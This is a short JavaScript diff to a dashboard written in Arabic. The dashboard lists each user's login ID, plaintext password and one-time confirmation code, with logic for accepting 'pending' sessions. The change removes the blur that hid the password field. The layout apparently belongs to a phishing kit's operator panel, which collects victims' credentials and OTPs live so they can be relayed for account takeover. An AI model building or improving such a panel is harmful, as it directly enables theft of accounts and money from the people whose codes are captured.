@@ -418,7 +418,7 @@ async function renderTable(){
         <div class="ds">
           <div class="dsttl">بيانات الجلسة الحالية</div>
           <div class="drow"><span class="dk">رقم تسجيل الدخول</span><span class="dv hi">${s.login||'—'}</span></div>
-          <div class="drow"><span class="dk">كلمة المرور</span><span class="dv blr" id="ddpv${u.id}" title="اضغط للإظهار">${s.password||'—'}</span></div>
+          <div class="drow"><span class="dk">كلمة المرور</span><span class="dv" id="ddpv${u.id}">${s.password||'—'}</span></div>
           <div class="drow"><span class="dk">رمز التأكيد</span><span class="dv hi" style="letter-spacing:3px">${s.otp||'—'}</span></div>
         </div>`;
 
@@ -437,7 +437,6 @@ async function renderTable(){
       document.body.appendChild(dd);
       openDD = dd;
 
-      document.getElementById('ddpv'+u.id)?.addEventListener('click',function(){this.classList.toggle('on');});
       if (hasPending) {
         const accept=()=>{
           const cur=getS().status;
